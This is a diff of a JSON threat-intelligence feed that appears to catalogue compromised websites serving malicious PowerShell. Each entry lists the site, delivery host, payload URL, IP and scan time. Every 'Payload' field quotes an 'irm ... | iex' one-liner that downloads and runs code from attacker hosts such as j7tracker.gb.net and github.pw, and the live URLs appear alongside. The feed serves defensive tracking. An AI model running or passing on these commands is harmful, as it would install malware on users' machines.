@@ -1,5 +1,43 @@
 [
   {
+    "UrlDomain": "hackandslashgames.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/ef9c80bd652ab34d"
+    ],
+    "IP": [
+      "162.159.135.42"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ef9c80bd652ab34d')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/ef9c80bd652ab34d"
+    ],
+    "ReportId": "cmwooi70420ts0omlj0pbm2lo",
+    "ScannedAt": "2026-11-20T07:49:52.529000+00:00"
+  },
+  {
+    "UrlDomain": "liajoffe.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/38ade94b3e931d9d"
+    ],
+    "IP": [
+      "162.241.144.19"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/38ade94b3e931d9d')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/38ade94b3e931d9d"
+    ],
+    "ReportId": "cmwooi4ba20ti0omludc2kosv",
+    "ScannedAt": "2026-11-20T07:49:49.061000+00:00"
+  },
+  {
     "UrlDomain": "www.moebelfan.com",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -9037,24 +9075,5 @@
     ],
     "ReportId": "cmwhmwg110tch0omlhhoi42we",
     "ScannedAt": "2026-11-15T09:30:34.966000+00:00"
-  },
-  {
-    "UrlDomain": "jendelamedia.com",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/Girya/b048f5c52ebe0ffe"
-    ],
-    "IP": [
-      "103.244.96.132"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/Girya/b048f5c52ebe0ffe')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/Girya/b048f5c52ebe0ffe"
-    ],
-    "ReportId": "cmwhj320f0szd0oml00i8ue6s",
-    "ScannedAt": "2026-11-15T07:43:44.936000+00:00"
   }
 ]
